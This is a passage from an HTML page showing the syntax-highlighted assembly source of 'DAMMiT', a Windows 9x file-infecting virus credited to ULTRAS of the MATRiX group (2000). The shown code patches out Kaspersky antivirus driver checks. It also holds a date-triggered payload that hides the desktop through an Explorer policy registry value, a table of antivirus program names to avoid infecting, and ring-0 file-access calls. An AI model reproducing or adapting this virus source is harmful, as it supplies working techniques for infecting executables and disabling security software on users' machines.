                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002Ah</span><span class="sc0"> </span><span class="sc1">; VMM</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc1">;VMMcall Get_DDB</span><span class="sc0">
</span><span class="sc5">VxDcall6</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0146h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0001h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">30h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; DDB_Service_Table_Ptr</span><span class="sc0">

                </span><span class="sc1">; LEA, but not MOV !</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">001Ah</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; VWIN32_SysErrorBox</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__kavxd_fuck</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">000Eh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; VWIN32_SetWin32Event</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__kavxd_fuck</span><span class="sc0">

</span><span class="sc5">__skip1</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__kavxd_continue</span><span class="sc0">

</span><span class="sc5">__kavxd_fuck</span><span class="sc4">:</span><span class="sc0">           
        </span><span class="sc6">pushad</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Control_Proc_0</span><span class="sc0">

</span><span class="sc5">__kavxd_1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; check presence for</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000FFFh</span><span class="sc0">  </span><span class="sc1">; each new page encountered</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__kavxd_2</span><span class="sc0">

                </span><span class="sc6">pushad</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">28</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; esi = MEMORY_BASIC_INFO</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">VxDcall7</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0134h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0001h</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0"> </span><span class="sc1">; mbi_state &amp; MEM_COMMIT</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__kavxd_2</span><span class="sc0">

                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__kavxd_2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">           </span><span class="sc1">; &lt;esi&gt;</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__kavxd_1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__kavxd_1</span><span class="sc0">

</span><span class="sc5">kavxd_kill_moveax</span><span class="sc4">:</span><span class="sc0">      
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">rt</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">; R0_xxx &lt;-- 0xFFFFFFFF</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">kavxd_kill_cd20</span><span class="sc4">:</span><span class="sc0">        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">20CDh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">rt</span><span class="sc0">
</span><span class="sc5">kavxd_kill_both</span><span class="sc4">:</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0B890h</span><span class="sc0">  </span><span class="sc1">; nop/mov eax, 1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">kavxd_kill_badcall</span><span class="sc4">:</span><span class="sc0">     
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">15FFh</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">kavxd_kill_both</span><span class="sc0">
</span><span class="sc5">rt</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">ret</span><span class="sc0">




</span><span class="sc5">PointerTope</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">KeyOfPolicies</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ValueName1</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"NoDesktop"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; no desktop :) icon killer</span><span class="sc0">
</span><span class="sc5">ValueToSet</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">


</span><span class="sc1">; small payload</span><span class="sc0">
</span><span class="sc1">; ~~~~~~~~~~~~~</span><span class="sc0">

</span><span class="sc5">CheckThePayloadDate</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">             </span><span class="sc1">; get day</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">71h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">             </span><span class="sc1">; Is it 1th?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoPayload</span><span class="sc0">

</span><span class="sc5">PayLoad1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PointerTope</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; just a buffer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">KeyOfPolicies</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; open this key</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000001h</span><span class="sc0">
</span><span class="sc5">VxDcall8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0148h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0001h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; reset stackpointer</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">; length of value</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ValueToSet</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; set value true</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">; type</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; reserved</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ValueName1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">PointerTope</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; handle</span><span class="sc0">
</span><span class="sc5">VxDcall9</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0152h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0001h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">NoPayload</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mark</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"DAMMiT by ULTRAS [MATRiX]"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"(c) 2000"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">; avoid infection of certain files</span><span class="sc0">
</span><span class="sc1">; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><span class="sc0">
</span><span class="sc1">;     tnx Billy Belcebu/iKX</span><span class="sc0">

</span><span class="sc5">avoidfilez</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">_notzinf</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; load table</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"."</span><span class="sc0">                    </span><span class="sc1">; search filename for a dot</span><span class="sc0">
            </span><span class="sc6">scasb</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc13">"\"                    ; now reverse the direction
</span><span class="sc0">            </span><span class="sc6">std</span><span class="sc0">                                </span><span class="sc1">; and search for the last \
            scasb</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                        </span><span class="sc1">; fix it</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">avoidf_loopz</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0BBh</span><span class="sc0">            </span><span class="sc1">; end of table?</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">procecedd</span><span class="sc0">              </span><span class="sc1">; hmm...</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">cmpsb</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">nevetoijizni</span><span class="sc0">               </span><span class="sc1">;not found?</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">avoidf_loopz</span><span class="sc0">               </span><span class="sc1">;nxt plz</span><span class="sc0">
</span><span class="sc5">procecedd</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
            </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">nevetoijizni</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">stc</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; to not infect these programmz</span><span class="sc0">
</span><span class="sc1">; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><span class="sc0">

</span><span class="sc5">_notzinf</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"AVP"</span><span class="sc0">      </span><span class="sc1">; AVP?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc3">"_AVP"</span><span class="sc0">     </span><span class="sc1">; AVP?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"NAV"</span><span class="sc0">      </span><span class="sc1">; Norton AV?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc3">"TB"</span><span class="sc0">       </span><span class="sc1">; ThunderByte?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc3">"F-"</span><span class="sc0">       </span><span class="sc1">; F-Prot?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"WEB"</span><span class="sc0">      </span><span class="sc1">; DrWeb?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"PAV"</span><span class="sc0">      </span><span class="sc1">; Panda?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc3">"GUARDDOG"</span><span class="sc0"> </span><span class="sc1">; Guarddog?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"DRW"</span><span class="sc0">      </span><span class="sc1">; Drweb?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc3">"SPIDER"</span><span class="sc0">   </span><span class="sc1">; Spider?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc3">"DSAV"</span><span class="sc0">     </span><span class="sc1">; Dr.solomon?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"NOD"</span><span class="sc0">      </span><span class="sc1">; Nod-ice?</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"MTX"</span><span class="sc0">      </span><span class="sc1">; MaTriX</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc3">"MATRIX"</span><span class="sc0">   </span><span class="sc1">; MATRiX? :))</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc3">"WINICE"</span><span class="sc0">   </span><span class="sc1">; SoftICE?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc3">"FDISK"</span><span class="sc0">    </span><span class="sc1">; Fdisk?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc3">"SCAN"</span><span class="sc0">     </span><span class="sc1">; Scan?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc3">"DEFRAG"</span><span class="sc0">   </span><span class="sc1">; Defrag?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0BBh</span><span class="sc0">

</span><span class="sc5">R0_FileI0</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">VxDcall10</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0032h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0040h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; vxdcall table</span><span class="sc0">
</span><span class="sc1">; ~~~~~~~~~~~~~</span><span class="sc0">

</span><span class="sc5">VxDtable</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VxDcall1</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0040000Dh</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VxDcall2</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00400067h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VxDcall3</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00400041h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VxDcall4</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00400032h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VxDcall5</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00270005h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VxDcall6</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00010146h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VxDcall7</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00010134h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VxDcall8</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00010148h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VxDcall9</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00010152h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VxDcall10</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00400032h</span><span class="sc0">
</span><span class="sc5">VxDTabSize</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">VxDTable</span><span class="sc4">)/</span><span class="sc2">8</span><span class="sc0">


</span><span class="sc5">VirusSize</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">

</span><span class="sc5">PEHead</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FileName</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Header</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">400h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">MemSize</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">

        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">
</span></div></body>
</html>
